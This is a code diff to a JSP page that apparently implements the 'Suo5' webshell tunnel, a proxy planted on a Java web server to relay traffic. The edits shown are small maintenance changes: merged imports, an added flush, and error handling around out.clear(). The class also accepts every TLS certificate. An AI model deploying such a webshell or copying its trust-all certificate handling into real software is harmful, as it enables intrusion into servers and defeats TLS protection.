@@ -1,11 +1,4 @@
-<%@ page import="java.nio.ByteBuffer" %>
-<%@ page import="java.io.*" %>
-<%@ page import="java.net.*" %>
-<%@ page import="java.security.cert.X509Certificate" %>
-<%@ page import="java.security.cert.CertificateException" %>
-<%@ page import="javax.net.ssl.*" %>
-<%@ page import="java.util.*" %>
-<%!
+<%@ page import="java.nio.ByteBuffer" %><%@ page import="java.io.*" %><%@ page import="java.net.*" %><%@ page import="java.security.cert.X509Certificate" %><%@ page import="java.security.cert.CertificateException" %><%@ page import="javax.net.ssl.*" %><%@ page import="java.util.*" %><%!
     public static class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
 
         static HashMap addrs = collectAddr();
@@ -73,6 +66,7 @@
             readInputStreamWithTimeout(in, data, 2000);
             OutputStream out = response.getOutputStream();
             out.write(data);
+            out.flush();
         }
 
 
@@ -128,7 +122,7 @@
             // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
             // System.arraycopy(original, from, copy, 0,  copyLength);
             for (int i = 0; i < copyLength; i++) {
-                copy[i] = original[from+i];
+                copy[i] = original[from + i];
             }
             return copy;
         }
@@ -514,12 +508,11 @@
             return new X509Certificate[0];
         }
     }
-%>
-<%
+%><%
     Suo5 o = new Suo5();
     o.process(request, response);
-
-    // avoid already getOutStream error
-    out.clear();
+    try {
+        out.clear();
+    } catch (Exception e)  {}
     out = pageContext.pushBody();
 %>
